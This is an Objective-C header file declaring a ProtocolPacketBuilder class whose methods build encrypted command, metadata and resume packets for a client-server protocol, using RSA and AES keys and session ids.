//
//  ProtocolPacketBuilder.h
//  ProtocolBuilder
//
//  Created by Pichaya Srifar on 7/26/11.
//  Copyright 2011 Vervata. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "CommandData.h"
#import "TransportDirectiveEnum.h"
#import "ProtocolPacketBuilderResponse.h"

@class CommandMetaData;

/**
 Build packet for sending to server
 */
@interface ProtocolPacketBuilder : NSObject {
	NSString *aesKey;
}

@property (nonatomic, retain) NSString *aesKey;

/**
 Build packet for a command
 @param command Command object
 @param metadata Command's meta data
 @param payloadPath 
 @param publicKey Server RSA public key
 @param SSID Server session id
 @param directive Transport directive of command
 @returns ProtocolPacketBuilderResponse object
 */
- (ProtocolPacketBuilderResponse *) buildPacketForCommand:(id<CommandData>)command 
											withMetaData:(CommandMetaData *)metadata 
											withPayloadPath:(NSString *)payloadPath
											withPublicKey:(NSData *)publicKey
												withSSID:(unsigned int)SSID
										   withDirective:(TransportDirective)directive;

/**
 Build meta data NSData
 @param metadata meta data object to build
 @param publicKey Server RSA public key
 @param aAESKey 
 @param SSID Server session id
 @param directive Transport directive of command
 */
- (NSData *) buildMetaData:(CommandMetaData *)metadata 
			withPublicKey:(NSData *)publicKey 
				withAESKey:(NSString *)aAESKey
				 withSSID:(unsigned int)SSID 
			withDirective:(TransportDirective)directive;

/**
 Build packet for RAsk command (not used)
 */
- (ProtocolPacketBuilderResponse *) buildRAskPacketWithMetaData:(CommandMetaData *)aMetaData 
											withSSID:(unsigned int)aSSID 
											withAESKey:(NSString *)aAESKey
											withPublicKey:(NSData *)aPublicKey
											withPayloadSize:(NSInteger)aPayloadSize
											withPayloadCRC32:(NSInteger)aPayloadCRC32;

/**
 Build packet for resume command
 */
- (ProtocolPacketBuilderResponse *) buildResumePacketData:(CommandMetaData *)aMetaData
								withPayloadPath:(NSString *)aPayloadPath
								withPublicKey:(NSData *)aPublicKey
								withAESKey:(NSString *)aAESKey  
								   withSSID:(NSInteger)aSSID 
							  withDirective:(NSInteger)aDirective
							withPayloadSize:(NSInteger)aPayloadSize
						   withPayloadCRC32:(NSInteger)aPayloadCRC32;

@end
